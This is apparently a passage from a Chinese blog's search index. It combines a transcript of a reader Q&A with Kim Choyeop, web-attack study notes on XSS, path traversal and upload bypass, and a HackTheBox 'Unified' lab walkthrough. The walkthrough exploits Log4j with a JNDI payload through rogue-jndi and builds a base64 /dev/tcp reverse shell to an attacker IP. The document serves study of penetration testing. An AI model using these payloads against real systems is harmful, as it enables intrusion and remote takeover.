(Dayan&amp;Abbott)https://boulderschool.yale.edu/sites/default/files/files/DayanAbbott.pdf","tags":["PDF","computational neuroscience"],"categories":["Read"]},{"title":"Vision01","path":"/2023/11/04/阅读/Vision01/","content":"This is a new book that I am reading. I have written a note about it.","tags":["science"],"categories":["Read"]},{"title":"20231022金草叶读者见面会问答部分","path":"/2023/10/22/胡言乱语/20231022金草叶读者见面会问答部分/","content":"10月22日 金草叶读者见面会部分 问：如果在短篇小说集只能选择一个故事的话会选择哪个故事推荐给读者呢？ 春：我会选择原作在第一篇，翻译版本放在比较后面的，朝圣者。我非常喜欢这个故事，因为我非常喜欢女孩的形象，因为她寻找自己的母亲，寻找自己祖母的生活经历，她来到地球，这是一个寻找自己的文化渊源，同时又不会忘记自己的梦想的这样一个非常执着的人物角色。我很喜欢这个故事，我想把它改成电影剧本，我和我的编剧朋友去讨论，但是我的编剧朋友很喜欢另外一篇，叫馆内遗失，她就把那篇改了一下。因为这个事情我们两个之间还有了一点点小矛盾，我们两个想法不一样，但是只能做同一件事情，如果两个人做不同的事情就会增加难度。但是后来我还有一些其他的工作，所以耽误了一下，没有进行下去了。我们后面仍然会努力去把这两个故事影视化。所以如果是我个人选的话会选择朝圣者。 金：（韩语） 春：这个我来讲吧。韩国读者选出来的最受欢迎的一篇是《光谱》，是中文版本的第一篇。这个在原书排的是比较后面的。但是我们的编辑老师，还有我们的科幻世界总编，特别喜欢《光谱》这一篇，希望我们的读者在翻开这本书的第一眼先看到《光谱》这一篇，所以把它调到了前面，当然也经过了作者老师的同意。然后在韩国影视化的时候，光谱这一篇是最先卖出了影视版权，目前正在拍电影，就是金宝拉导演。蜂鸟的金宝拉导演。所以在不久的将来，今年或者明年初，就会有可能与大家见面，大家可以多多关注一下。但是其实作者本人，和读者的选择会有一点点差别。她最喜欢的一篇应该是共生假说。她觉得在所有这里面这是她写作时最享受的一篇，同时也没有什么创作的烦恼，比如说是有时候写着写着写不下去了，或者头痛啊或者苦恼或者有压力。作者说写这篇的时候，完全没有上述感觉，非常流畅，像在跟一个人讲故事一样，一下子就写下来了，是一个很愉快的著作经历，所以她最喜欢共生假说。 夏：其实，其实我本人最喜欢的也是《光谱》，但是刚刚已经介绍过了。所以我就推荐另外一篇，就是关于我的太空英雄。因为我觉得关于我的太空英雄，金草叶老师写了非常独特一段的一对女性关系，她写了两代女性不同价值选择。可能作为上一代的姨妈，去出走，去反抗体制，最终一跃进入大海，获得了真正的自由。女主作为下一代的女性，她还是选择在这个系统内，通过自己的努力，选择与其他宇航员竞争，最终她一步一步到达那里。她最后也说，可能最终到达黑洞的另外一边，也会发现那里的风景不过如此，但是她也会跟她的姨妈说，我终于到达这里了。我觉得金草叶老师写了两代女性的价值选择的时候，她并没有去做一种审判，就是哪一种是更正确的选择。她给两代女性都有可以自己选择的空间，并且我觉得她们最后都是在自己的立场上实现了自己的人生价值。所以从这篇故事可以看出，金草叶老师对女性是有一种，发自内心的关怀，所以我非常非常的感动。 问：谢谢刚刚三位老师的回答，在金草叶老师的故事中，时常会给读者心灵有一个很大的震撼。在刚刚提到的故事中你们认为主人公打动你们的特质在哪儿呢？ 金：（韩语） 翻译：关于这个问题呢，金草叶老师想从两个方面来阐述。第一个是一种好奇心，对一些事情她的孜孜以求的好奇心。第二个呢，是永远不言放弃，也不屈服，她要以自己的一种立场或者以自己的想法，去实现她的梦想。 春：我就接着继续讲，我喜欢她的作品也是同样的原因。她作品里的女性都是非常自主自立，能够知道我需要什么，然后并且为了我自己的梦想去努力奋斗。但是大家可能不知道金老师年纪，她年纪不大，她出版这本书，大概是2017年2018年的样子，她就是二十岁出头。那我自己的经历，我二十多岁还是被困在一个家庭中，道德枷锁或者社会对我的一些规则，受到了很大的局限，就是没有那么勇敢的做我自己。但是当我到了35岁以后，刚好我就看到了她的书，那我觉得她作为一个年轻的女性，她远远比我在这个时候要优秀的多，她非常的自立，她又很强悍。她作品里的人物，其实她作品里很少有男性出现，偶尔会有，但是那些男性都是非常不友好的。他们会攻击你，但是她里面的女性人物都没有屈服，都直接地说你去刚她也好，我把我自己变得更加强大也好，但是我不会害怕你，我要勇敢地去斗争，为了我们自己，为了我们女性去斗争。这种精神，她也激励了我，更加坚强地，正确地认识到我自己。因为我觉得我现在就四十岁嘛，可能我的四十多岁到五十岁的这十年，她的作品激励了我，我可以更加坚定自己前面未来的路，所以最打动我的一点所在。 夏：刚刚老师讲的是我的太空英雄这篇是吧。我觉得太空英雄这篇除了崔在景出走的精神之外，她也有脆弱的时候，情绪不稳定的时候，但是在那种人性的角度下，她不是那种面面俱到的，一致特别刚强的那种。在这种人性的角度下，依然有自己的价值坚持，就比如说，不管是在太空英雄下崔作为大龄宇航员有很多自由，背弃了社会赋予她的责任。可能这是社会层面上觉得她的缺陷，但是，她是一个生动的人，包括其他故事也是，在《我们无法与光速前进》里一个年长的女性，她是离经叛道的，她是不讲道理的，她就是会为了自己的价值选择，会选择自毁式的，追寻那么一趟。我觉得金老师她非常非常会写人，非常非常会写女性，也非常非常会写弱者，就是三者在她笔下都是共通的。这就是她笔下人物最打动我的一点。 问：想知道金草叶老师是怎么挖掘，那些角色动人地另一面的呢？ 金：（韩语） 翻译：我们可以看到金草叶老师描述这个光，黑暗与光影之间的一个对比，是非常明显的。核心的一个思想是可以看到描写世界末日，人文尽头，这样相对悲观的一些情愫在里面，但是金草叶老师希望我们人类的存在来讲，去唤醒世界当中的一些光明，照亮我们未来，她希望在我们心中，用一句不忘初心，不忘来时路，能够让大家去迎接更多的光明。 问：《馆内遗失》的结局是母女和解，母女之间是否有更多可能性的结局？ 金：（韩语） 翻译：写作这篇故事她更多着墨于现实的问题，她希望基于现实的情况下，可以延申出来更进步的，更深的想象和思考在里面。 问：金老师写作两本书之间是否有思想上的转变？因为可以看到长篇小说更专注女性自身。 金：（韩语） 春：她想说她第一部作品（长篇小说）的时候，因为是一个共同体，一个女性的组织，一个女性互助的组织，因为女性之间有能够共情。其实男性他哪怕是你的父亲，你亲的哥哥，你亲弟弟，哪怕是你自己的儿子，可能你给他们说这些事情，他都不会懂，她觉得很矫情对不对。但是只有我们女性能够互相的明白你为什么这样痛苦。其实她觉得，大家都被这个社会规则教化了之后呢，其实你受到这些，你受到伤害，你可能就没有那么敏感，你可能会理所当然，哎反正大家都这样，都这么做嘛，那我没办法。但是她在第一部作品里呢，其实就是想通过这样一个女性的互助组织，增加我们女性的集体的力量，然后跟一些社会规则做抗争。但是其实读者的一些反应，包括作者自己看到的一些社会上的现象，她又发现，女性共同体只是女性自己的努力，我们女性也不可能说完全的去团结，也会有矛盾，或者有些不足的地方。所以她在写地球尽头温室的时候就会有这样一个反思，说那我就让这个故事里面这个女性共同体破裂掉，就会有一些问题，或者塌了，合作不起来了。但是我们通过这样一种失败的经历，我们来找我们自己的问题，那大家彼此更多的去理解去和解。最后我们再联合起来，我们能够变得更加的强大，所以这就是针对于作者她认为温室比光速进步的地方。 读者提问：您曾经提到创作时不会想象特定人物的长相，那可以谈谈您认为什么样的小说可以不描写特定人物的长相？ 金：（韩语） 翻译：首先金草叶老师想澄清一点，她在写作创作的时候的她的立场和倾向性。和其他的作者不同，金老师在描述一个故事的时候她聚焦在故事的情节和人物事件上，而不是刻画人物具体的外貌长相。剩下的可以留给读者自己想象。 问：最适合影视化的作品是什么？我是文科生又热爱文学，金老师有没有想给我们所有的女性什么寄语？ 金：（韩语） 翻译：第一个问题，是《太空英雄》。这部小说的题材比较广阔宏大，可以用影视手法表现出来，视觉上会感觉很强烈。第二个问题的回答，她希望如果周围的人如果有人说你这个人很奇怪，很怪异的话，不要去理会他。因为这恰恰说明你身上的闪亮点，是你独有的符号。通常来说，优秀的女性在她成年之前，作为一个小女孩她可能会经常听到这样的话，但是金老师希望大家不要在意这些杂言碎语，要做真实的自己。","tags":["阅读","科幻","见面分享会"],"categories":["碎碎念"]},{"title":"pikachu靶场通关.pdf","path":"/2023/09/12/靶场/PDFpikachu/","content":"","tags":["笔记","靶场","PDF"],"categories":["Range","pikachu"]},{"title":"小鼠相关","path":"/2023/08/27/胡言乱语/小鼠相关/","content":" 您好, 我没有主动给密码就说明你没有权限."},{"title":"第52天：WEB攻防-XSS跨站&反射型&存储型&DOM型&标签闭合&输入输出&JS代码解析","path":"/2023/08/27/xiaodi8/web/web攻防笔记第52天/","content":"#XSS跨站-输入输出-原理&amp;分类&amp;闭合漏洞原理：接受输入数据，输出显示数据后解析执行 基础类型：反射(非持续)【用处比较小】，存储(持续)，DOM-BASE 拓展类型：jquery，mxss，uxss，pdfxss，flashxss，上传xss等 常用标签：https://www.freebuf.com/articles/web/340080.html 攻击利用：盲打，COOKIE盗取，凭据窃取，页面劫持，网络钓鱼，权限维持等 安全修复：字符过滤，实例化编码，http_only，CSP防护，WAF拦截等 测试流程：看输出，想输入在哪里，更改输入代码看执行（标签，过滤决定） #XSS跨站-分类测试-反射&amp;存储&amp;DOM-数据交互的地方，交互的地方越多利用价值越大 get、post、headers 反馈与浏览 富文本编辑器 各类标签插入和自定义 -数据输出的地方 用户资料 数据输出 评论，留言等 关键词、标签、说明 文件上传 反射型XSS：（某案例测试） 常见情况是攻击者通过构造一个恶意链接的形式，诱导用户传播和打开， 由于链接内所携带的参数会回显于页面中或作为页面的处理数据源，最终造成XSS攻击。 存储型XSS：（某案例测试） 存储型XSS是持久化的XSS攻击方式，将恶意代码存储于服务器端， 当其他用户再次访问页面时触发，造成XSS攻击。 DOM-base型XSS：（某案例测试） 通过修改原始的客户端代码，受害者浏览器的DOM环境改变，导致有效载荷的执行。 页面本身没有变化，但由于DOM环境被恶意修改，有客户端代码被包含进了页面并执行。","tags":["笔记","xiaodi8","web攻防"],"categories":["小迪","web攻防"]},{"title":"第51天：WEB攻防-前后台功能点&文件下载&文件读取&文件删除&目录遍历&目录穿越","path":"/2023/08/27/xiaodi8/web/web攻防笔记第51天/","content":"#文件安全-下载&amp;删除-黑白盒1、下载&#x3D;读取 常规下载URL：http://www.xiaodi8.com/upload/123.pdf 直连连接 可能存在安全问题URL：http://www.xiaodi8.com/xx.xx?file=123.pdf 利用：常规下载敏感文件（数据库配置，中间件配置，系统密匙等文件信息） 安全问题：下载的文件以参数值去发送解析下载，如果更改的参数值就是指定下载文件 思路：目录扫描得知目录文件结构，利用URL下载源码，观察源码文件是什么项目，从网上找相关项目代码目录，接着继续下载。 ****文件下载漏洞：****https://blog.csdn.net/qq_53079406/article/details/124076937 1../../../etc/passwd 2、文件删除（常出现后台中）测试比较危险，可能喝茶，大多后台 可能存在安全问题：前台或后台有删除功能应用 利用：常规删除重装锁定配合程序重装或高危操作 文件相关漏洞类型：上传、下载、读取、删除、编辑 #目录安全-遍历&amp;穿越-黑白盒1、目录遍历 目录权限控制不当，通过遍历获取到有价值的信息文件去利用 2、目录穿越（常出现后台中） 目录权限控制不当，通过控制查看目录路径穿越到其他目录或判断获取价值文件再利用 #黑盒分析1、功能点 文件上传，文件下载，文件删除，文件管理器等地方 2、URL特征 文件名： download，down，readfile，read，del，dir，path，src，Lang等 参数名： file、path、data、filepath、readfile、data、url、realpath等 #白盒分析上传类函数，删除类函数，下载类函数，目录操作函数，读取查看函数等","tags":["笔记","xiaodi8","web攻防"],"categories":["小迪","web攻防"]},{"title":"第49天：WEB攻防-文件上传&存储安全&OSS对象&分站&解析安全&解码还原&目录执行","path":"/2023/08/27/xiaodi8/web/web攻防笔记第49天/","content":"文件-解析方案-执行权限&amp;解码还原1、执行权限 文件上传后存储目录不给执行权限 2、解码还原 数据做存储，解析固定（文件后缀名无关） 文件上传后利用编码传输解码还原 文件-存储方案-分站存储&amp;OSS对象1、分站存储 upload.xiaodi8.com 上传 images.xiaodi8.com 存储 2、OSS对象 Access控制-OSS对象存储-Bucket对象 访问只是下载，永远只是下载，传上去后门也没用。 如何判断执行权限：上传后无法访问403【换另目录上传】 解码还原：上传后抓包看RequestURL，是data:image&#x2F;png;base64,一长串编码符号数据【无解】 分站存储：看图片地址和上传域名不是一样的【无解】 OSS对象：看URL或者去访问一下上传的地址，打开就下载【无解】 安全绕过以上方案除目录设置权限如能换目录解析绕过外，其他均无解","tags":["笔记","xiaodi8","web攻防"],"categories":["小迪","web攻防"]},{"title":"第48天：WEB攻防-PHP应用&文件上传&中间件CVE解析&第三方编辑器&已知CMS漏洞","path":"/2023/08/02/xiaodi8/web/web攻防笔记第48天/","content":"PHP-中间件-上传相关-Apache&amp;Nginx复现漏洞环境：vulhub （部署搭建看打包视频） 由于PHP搭建常用中间件：IIS，Apache，Nginx Web搭建在存在漏洞的中间件上，漏洞影响这文件的解析即配合上传 CVE-2017-15715（换行解析漏洞）https://blog.csdn.net/youthbelief/article/details/121258770 版本：Apache2.4.0~2.4.29 有上传点 上传点可重命名文件 CVE-2013-4547https://blog.csdn.net/weixin_45744814/article/details/120390057 版本：Nginx 0.8.411.4.3、Nginx 1.5.01.5.7 PHP-编辑器-上传相关-第三方处理引用复现漏洞环境：ueditor （部署搭建看打包视频） 由于编辑器漏洞较少，实战碰到机会不大，主要理解漏洞产生的思路 参考：https://cloud.tencent.com/developer/article/2200036 参考：https://blog.csdn.net/qq_45813980/article/details/126866682 引用到外部的第三方编辑器实现文件上传，编辑器的安全即是上传安全 PHP-CMS源码-上传相关-已知识别到利用复现漏洞环境：通达OA-V11.2 从未知的源码体系测试原生态上传安全，现在是已知CMS源码架构，利用已知的漏洞测试","tags":["笔记","xiaodi8","web攻防"],"categories":["小迪","web攻防"]},{"title":"HTB-Unified","path":"/2023/08/02/HTB/HTB-Unified/","content":"Unified复现开局找教程： https://blog.csdn.net/qq_40927195&#x2F;article&#x2F;details&#x2F;128811787 HackTheBox - Unified_unificms6.4.54_Briyney的博客-CSDN博客 开局就是一个扫描的动作： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123┌──(root㉿kali)-[/home/kali/Desktop]└─# nmap -sC -sV 10.129.181.184Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-25 02:31 EDTNmap scan report for 10.129.181.184Host is up (0.36s latency).Not shown: 972 closed tcp ports (reset)PORT STATE SERVICE VERSION17/tcp filtered qotd22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)465/tcp filtered smtps714/tcp filtered iris-xpcs765/tcp filtered webster1055/tcp filtered ansyslmd1110/tcp filtered nfsd-status1198/tcp filtered cajo-discovery3001/tcp filtered nessus3351/tcp filtered btrieve3737/tcp filtered xpanel3914/tcp filtered listcrt-port-24111/tcp filtered xgrid5431/tcp filtered park-agent5510/tcp filtered secureidprop5906/tcp filtered rpas-c26789/tcp open ibm-db2-admin?8011/tcp filtered unknown8080/tcp open http-proxy| fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 | Content-Type: text/html;charset=utf-8| Content-Language: en| Content-Length: 431| Date: Tue, 25 Jul 2023 06:35:50 GMT| Connection: close| &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 404 | Found&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 404 | Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;| GetRequest, HTTPOptions: | HTTP/1.1 302 | Location: http://localhost:8080/manage| Content-Length: 0| Date: Tue, 25 Jul 2023 06:35:49 GMT| Connection: close| RTSPRequest: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8| Content-Language: en| Content-Length: 435| Date: Tue, 25 Jul 2023 06:35:50 GMT| Connection: close| &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 | Request&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 | Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;| Socks5: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8| Content-Language: en| Content-Length: 435| Date: Tue, 25 Jul 2023 06:35:52 GMT| Connection: close| &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 | Request&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 |_ Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;8192/tcp filtered sophos8443/tcp open ssl/nagios-nsca Nagios NSCA| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US| Subject Alternative Name: DNS:UniFi| Not valid before: 2021-12-30T21:37:24|_Not valid after: 2024-04-03T21:37:248649/tcp filtered unknown9091/tcp filtered xmltec-xmlmail9102/tcp filtered jetdirect10025/tcp filtered unknown10215/tcp filtered unknown32777/tcp filtered sometimes-rpc1738292/tcp filtered landesk-cba1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8080-TCP:V=7.93%I=7%D=7/25%Time=64BF6D46%P=x86_64-pc-linux-gnu%r(GeSF:tRequest,84,&quot;HTTP/1\\.1\\x20302\\x20\\r Location:\\x20http://localhost:8080SF:/manage\\r Content-Length:\\x200\\r Date:\\x20Tue,\\x2025\\x20Jul\\x202023\\xSF:2006:35:49\\x20GMT\\r Connection:\\x20close\\r \\r &quot;)%r(HTTPOptions,84,&quot;HSF:TTP/1\\.1\\x20302\\x20\\r Location:\\x20http://localhost:8080/manage\\r ConSF:tent-Length:\\x200\\r Date:\\x20Tue,\\x2025\\x20Jul\\x202023\\x2006:35:49\\x20SF:GMT\\r Connection:\\x20close\\r \\r &quot;)%r(RTSPRequest,24E,&quot;HTTP/1\\.1\\x204SF:00\\x20\\r Content-Type:\\x20text/html;charset=utf-8\\r Content-Language:SF:\\x20en\\r Content-Length:\\x20435\\r Date:\\x20Tue,\\x2025\\x20Jul\\x202023\\SF:x2006:35:50\\x20GMT\\r Connection:\\x20close\\r \\r &lt;!doctype\\x20html&gt;&lt;htSF:ml\\x20lang=\\&quot;en\\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x2SF:0Bad\\x20Request&lt;/title&gt;&lt;style\\x20type=\\&quot;text/css\\&quot;&gt;body\\x20&#123;font-familySF::Tahoma,Arial,sans-serif;&#125;\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20&#123;color:white;baSF:ckground-color:#525D76;&#125;\\x20h1\\x20&#123;font-size:22px;&#125;\\x20h2\\x20&#123;font-sizeSF::16px;&#125;\\x20h3\\x20&#123;font-size:14px;&#125;\\x20p\\x20&#123;font-size:12px;&#125;\\x20a\\x20&#123;cSF:olor:black;&#125;\\x20\\.line\\x20&#123;height:1px;background-color:#525D76;border:nSF:one;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20SF:Bad\\x20Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;)%r(FourOhFourRequest,24A,&quot;HTTP/1\\.1\\SF:x20404\\x20\\r Content-Type:\\x20text/html;charset=utf-8\\r Content-LanguSF:age:\\x20en\\r Content-Length:\\x20431\\r Date:\\x20Tue,\\x2025\\x20Jul\\x202SF:023\\x2006:35:50\\x20GMT\\r Connection:\\x20close\\r \\r &lt;!doctype\\x20htmlSF:&gt;&lt;html\\x20lang=\\&quot;en\\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\\x20Status\\x20404\\x20\\xe2\\x80\\x9SF:3\\x20Not\\x20Found&lt;/title&gt;&lt;style\\x20type=\\&quot;text/css\\&quot;&gt;body\\x20&#123;font-famiSF:ly:Tahoma,Arial,sans-serif;&#125;\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20&#123;color:white;SF:background-color:#525D76;&#125;\\x20h1\\x20&#123;font-size:22px;&#125;\\x20h2\\x20&#123;font-siSF:ze:16px;&#125;\\x20h3\\x20&#123;font-size:14px;&#125;\\x20p\\x20&#123;font-size:12px;&#125;\\x20a\\x20SF:&#123;color:black;&#125;\\x20\\.line\\x20&#123;height:1px;background-color:#525D76;borderSF::none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\\x20Status\\x20404\\x20\\xe2\\x80\\x93\\xSF:20Not\\x20Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;)%r(Socks5,24E,&quot;HTTP/1\\.1\\x20400\\x20\\SF:r Content-Type:\\x20text/html;charset=utf-8\\r Content-Language:\\x20en\\SF:r Content-Length:\\x20435\\r Date:\\x20Tue,\\x2025\\x20Jul\\x202023\\x2006:3SF:5:52\\x20GMT\\r Connection:\\x20close\\r \\r &lt;!doctype\\x20html&gt;&lt;html\\x20lSF:ang=\\&quot;en\\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x2SF:0Request&lt;/title&gt;&lt;style\\x20type=\\&quot;text/css\\&quot;&gt;body\\x20&#123;font-family:TahomaSF:,Arial,sans-serif;&#125;\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20&#123;color:white;backgrounSF:d-color:#525D76;&#125;\\x20h1\\x20&#123;font-size:22px;&#125;\\x20h2\\x20&#123;font-size:16px;&#125;SF:\\x20h3\\x20&#123;font-size:14px;&#125;\\x20p\\x20&#123;font-size:12px;&#125;\\x20a\\x20&#123;color:blSF:ack;&#125;\\x20\\.line\\x20&#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/SF:style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20SF:Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;);Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 411.50 seconds 开放端口有：22、6789、8080、8443 扫描显示端口8080打开，正在运行HTTP代理。代理似乎将请求重定向到端口8443，该端口似乎正在运行SSL web服务器。我们注意到端口8443上页面的HTTP标题是“UniFi网络”。 访问8080端口，重定向到这里：https://10.129.181.184:8443/manage/account/login?redirect=%2Fmanage 不贴图了，上传太麻烦了，大概就是一个登录界面，显示UniFi 6.4.54 的CMS（内容管理系统） 网上查找版本漏洞：CVE-2021-44228（Apache Log4j远程代码执行漏洞）NVD - CVE-2021-44228 (nist.gov) 关于log4j的更多资料：What’s Going on With Log4j? (hackthebox.com) 先抓个包，接下来就是验证这个网站是否真的存在这个漏洞： 1234567891011121314151617181920212223#登录验证的原始包POST /api/login HTTP/1.1Host: 10.129.183.167:8443User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: https://10.129.183.167:8443/manage/account/login?redirect=%2FmanageContent-Type: application/json; charset=utf-8Origin: https://10.129.183.167:8443Content-Length: 74Sec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-originTe: trailersConnection: close&#123; &quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:&quot;admin1234&quot;, &quot;remember&quot;:false, &quot;strict&quot;:true&#125; payload：$&#123;jndi:ldap://&#123;TunX IP Address&#125;/whatever&#125; 探测注入点是否存在，If the request causes the server to connect back to us, then we have verified that the application is vulnerable.(假如请求引起的服务器回连我们，我们就已经验证了应用程序存在漏洞。) JNDI是Java命名和目录接口API的首字母缩写。通过调用此API，应用程序可以定位资源和其他程序对象。资源是一个程序对象，它提供与系统（如数据库服务器和消息传递系统）的连接。 LDAP是轻量级目录访问协议的缩写，它是一种开放的、与供应商无关的、行业标准的应用程序协议，用于通过Internet或网络访问和维护分布式目录信息服务。LDAP运行的默认端口是端口389。 🔒 tcpdump：是Wireshark的程序或软件，但它是命令行版本。 -i： 选择接口。（例如eth0、wlan、tun0） port 389：选择我们正在侦听的端口。 ifconfig确认ip后开始监听tun0： 123456┌──(root㉿kali)-[/home/kali/Desktop]└─# tcpdump -i tun0 port 389tcpdump: verbose output suppressed, use -v[v]... for full protocol decodelistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes08:06:56.744094 IP 10.129.202.83.38274 &gt; 10.10.14.84.ldap: Flags [S], seq 4090119358, win 64240, options [mss 1340,sackOK,TS val 4125686722 ecr 0,nop,wscale 7], length 008:06:56.744126 IP 10.10.14.84.ldap &gt; 10.129.202.83.38274: Flags [R.], seq 0, ack 4090119359, win 0, length 0 tcpdump输出显示了我们机器上正在接收的连接。这证明该应用程序确实存在漏洞，因为它正试图在LDAP端口389上连接回我们。 安装Open-JDK and Maven为了构建payload并且发送，以及能在被攻击的系统运行： Open JDK是Java开发工具包，用于构建Java应用程序。另一方面，Maven是一个集成开发环境（IDE），可用于创建结构化项目并将我们的项目编译为jar文件。 1234567┌──(root㉿kali)-[/home/kali/Desktop]└─# mvn -vApache Maven 3.8.7Maven home: /usr/share/mavenJava version: 17.0.6, vendor: Debian, runtime: /usr/lib/jvm/java-17-openjdk-amd64Default locale: en_US, platform encoding: UTF-8OS name: &quot;linux&quot;, version: &quot;6.1.0-kali9-amd64&quot;, arch: &quot;amd64&quot;, family: &quot;unix&quot; 安装rogue-jndi工具并编译： 123git clone https://github.com/veracode-research/rogue-jndicd rogue-jndimvn package 编译成功后显示： 12345678[INFO] Replacing /home/kali/Desktop/rogue-jndi/target/RogueJndi-1.1.jar with /home/kali/Desktop/rogue-jndi/target/RogueJndi-1.1-shaded.jar[INFO] Dependency-reduced POM written at: /home/kali/Desktop/rogue-jndi/dependency-reduced-pom.xml[INFO] ------------------------------------------------------------------------[INFO] BUILD SUCCESS[INFO] ------------------------------------------------------------------------[INFO] Total time: 07:29 min[INFO] Finished at: 2023-07-31T07:54:52-04:00[INFO] ------------------------------------------------------------------------ 查看编译后可运行的程序： 1234567891011┌──(root㉿kali)-[/home/kali/Desktop/rogue-jndi]└─# ls -al targettotal 11692drwxr-xr-x 6 root root 4096 Jul 31 07:54 .drwxr-xr-x 5 root root 4096 Jul 31 07:54 ..drwxr-xr-x 4 root root 4096 Jul 31 07:51 classesdrwxr-xr-x 3 root root 4096 Jul 31 07:51 generated-sourcesdrwxr-xr-x 2 root root 4096 Jul 31 07:52 maven-archiverdrwxr-xr-x 3 root root 4096 Jul 31 07:51 maven-status-rw-r--r-- 1 root root 22240 Jul 31 07:52 original-RogueJndi-1.1.jar-rw-r--r-- 1 root root 11920109 Jul 31 07:54 RogueJndi-1.1.jar 查看肉鸽帮助命令： 12345678910111213141516171819202122┌──(root㉿kali)-[/home/kali/Desktop/rogue-jndi]└─# cd target ┌──(root㉿kali)-[/home/kali/Desktop/rogue-jndi/target]└─# java -jar RogueJndi-1.1.jar --help+-+-+-+-+-+-+-+-+-+|R|o|g|u|e|J|n|d|i|+-+-+-+-+-+-+-+-+-+Usage: java -jar target/RogueJndi-1.0.jar [options] Options: -c, --command Command to execute on the target server (default: /Applications/Calculator.app/Contents/MacOS/Calculator) -n, --hostname Local HTTP server hostname (required for remote classloading and websphere payloads) (default: 127.0.1.1) -l, --ldapPort Ldap bind port (default: 1389) -p, --httpPort Http bind port (default: 8000) --wsdl [websphere1 payload option] WSDL file with XXE payload (default: /list.wsdl) --localjar [websphere2 payload option] Local jar file to load (this file should be located on the remote server) (default: ../../../../../tmp/jar_cache7808167489549525095.tmp) -h, --help Show this help 可以看到它的--command后面就跟想要执行的系统命令，我们就可以写一个反弹shell了同时为了数据再传输过程中不丢失，我们对反弹shell命令进行base64编码echo &quot;/bin/bash -c &#39;/bin/bash -i &gt;&amp;/dev/tcp/10.10.14.179/4444 0&gt;&amp;1&#39;&quot; | base64这样就得到了base64加密后的shell 12345┌──(kali㉿kali)-[~/Desktop]└─$ echo &quot;/bin/bash -c &#x27;/bin/bash -i &gt;&amp;/dev/tcp/10.10.14.84/4444 0&gt;&amp;1&#x27;&quot; | base64 L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYvZGV2L3RjcC8xMC4xMC4xNC44NC80NDQ0IDA+JjEnCg== 使用肉鸽监听4444端口： 123456789101112131415┌──(root㉿kali)-[/home/kali/Desktop/rogue-jndi/target]└─# java 